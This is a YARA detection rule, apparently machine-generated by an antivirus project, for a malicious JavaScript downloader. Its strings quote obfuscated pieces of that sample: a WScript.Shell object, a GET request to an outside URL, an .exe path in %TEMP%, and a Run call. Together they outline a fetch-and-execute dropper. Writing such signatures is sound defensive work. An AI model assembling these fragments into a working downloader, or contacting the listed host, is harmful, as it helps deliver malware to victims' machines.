rule sig_20160401_709deb5df3dd47d7c95326596666f34d {
  meta:
    description = "datamaliciousorder - file 20160401_709deb5df3dd47d7c95326596666f34d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "6355d3f05e7efd74cae17e763666ee6d8f429abcc73c31bcd4b4703e766911e2"

  strings:
    $s1  = "function UsJc(HoGk, ZlZiq){VfGk = VfGk * 1; return HoGk - ZlZiq;};" fullword ascii
    $s2  = "var YyHcr = function PbSa() {return WScript[BrFwf](\"WScript\"+\".Shell\");}(), ZlvYk = 11;" fullword ascii
    $s3  = "GmaYh[GluCm](\"G\" + \"ET\", \"http://grafikeria.pl/o9ows\", false);" fullword ascii
    $s4  = "if (GmaYh[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function YfuLne() {return YyHcr[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"oRmo2LLGdE.ex\" + \"e\";};" fullword ascii
    $s6  = "function IxXzl(){return TpkLvy + \"\";};" fullword ascii
    $s7  = "function RrmQs() {return ((TrEhv == true) && (TrEhv == LpLg)) ? 1 : VfGk;};" fullword ascii
    $s8  = "function QxfCv(MzVuq){YyHcr[\"R\"+\"un\"](MzVuq, VfGk, VfGk);};" fullword ascii
    $s9  = "LpLg = true; " fullword ascii
    $s10 = "var IfIp = new this[\"Date\"]();" fullword ascii
    $s11 = "var TrEhv = false;" fullword ascii
    $s12 = "function AgAjf(FnQak) {var RtsPl = (1, 2, 3, 4, 5, FnQak); return RtsPl;};" fullword ascii
    $s13 = "}while (NkfEu);" fullword ascii
    $s14 = "function MyPl()" fullword ascii
    $s15 = "var WcoJw = false;" fullword ascii
    $s16 = "var LpLg = false;" fullword ascii
    $s17 = "function WfbLa(){return 23;};" fullword ascii
    $s18 = "TrEhv = true; " fullword ascii
    $s19 = "return UsJc(PhjUow, FemYub);" fullword ascii
    $s20 = "function QkZk(){return BrFwf;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}